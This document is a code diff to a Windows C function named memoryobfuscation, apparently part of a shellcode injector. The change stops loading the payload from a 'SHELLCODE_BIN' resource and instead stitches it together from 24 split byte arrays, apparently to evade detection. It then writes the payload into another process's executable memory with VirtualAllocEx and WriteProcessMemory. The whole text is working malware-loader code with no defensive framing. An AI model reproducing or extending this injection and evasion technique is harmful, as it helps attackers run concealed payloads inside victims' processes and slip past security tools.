@@ -76,20 +76,42 @@ void memoryobfuscation(){
 
     // build shc array
 
-    DWORD sidecar_bin_len = 0;
-    unsigned char* sidecar_bin = NULL;
-
-    HRSRC hRes = FindResource(NULL, "SHELLCODE_BIN", RT_RCDATA);
-
-    HGLOBAL hData = LoadResource(NULL, hRes);
-
-    void* pRes = LockResource(hData);
-
-    sidecar_bin_len = SizeofResource(NULL, hRes);
-
-    sidecar_bin = (unsigned char*)pRes;
+    unsigned char* parts[] = {
+        sidecar_bin_part_0, sidecar_bin_part_1, sidecar_bin_part_2,
+        sidecar_bin_part_3, sidecar_bin_part_4, sidecar_bin_part_5,
+        sidecar_bin_part_6, sidecar_bin_part_7, sidecar_bin_part_8,
+        sidecar_bin_part_9, sidecar_bin_part_10, sidecar_bin_part_11,
+        sidecar_bin_part_12, sidecar_bin_part_13, sidecar_bin_part_14,
+        sidecar_bin_part_15, sidecar_bin_part_16, sidecar_bin_part_17,
+        sidecar_bin_part_18, sidecar_bin_part_19, sidecar_bin_part_20,
+        sidecar_bin_part_21, sidecar_bin_part_22, sidecar_bin_part_23
+    };
+    unsigned int lengths[] = {
+        sidecar_bin_part_0_len, sidecar_bin_part_1_len, sidecar_bin_part_2_len,
+        sidecar_bin_part_3_len, sidecar_bin_part_4_len, sidecar_bin_part_5_len,
+        sidecar_bin_part_6_len, sidecar_bin_part_7_len, sidecar_bin_part_8_len,
+        sidecar_bin_part_9_len, sidecar_bin_part_10_len, sidecar_bin_part_11_len,
+        sidecar_bin_part_12_len, sidecar_bin_part_13_len, sidecar_bin_part_14_len,
+        sidecar_bin_part_15_len, sidecar_bin_part_16_len, sidecar_bin_part_17_len,
+        sidecar_bin_part_18_len, sidecar_bin_part_19_len, sidecar_bin_part_20_len,
+        sidecar_bin_part_21_len, sidecar_bin_part_22_len, sidecar_bin_part_23_len
+    };
+    int num_parts = sizeof(parts) / sizeof(parts[0]);
+    unsigned int sidecar_bin_len = 0;
+    for (int i = 0; i < num_parts; ++i) {
+        sidecar_bin_len += lengths[i];
+    }
+    unsigned char* sidecar_bin = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, sidecar_bin_len);
+    unsigned int offset = 0;
+    for (int i = 0; i < num_parts; ++i) {
+        CopyMemory(sidecar_bin + offset, parts[i], lengths[i]);
+        offset += lengths[i];
+    }
 
     LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sidecar_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMem) {
+        return;
+    }
 
     if (!WriteProcessMemory(pi.hProcess, remoteMem, sidecar_bin, sidecar_bin_len, NULL)) {
         return;
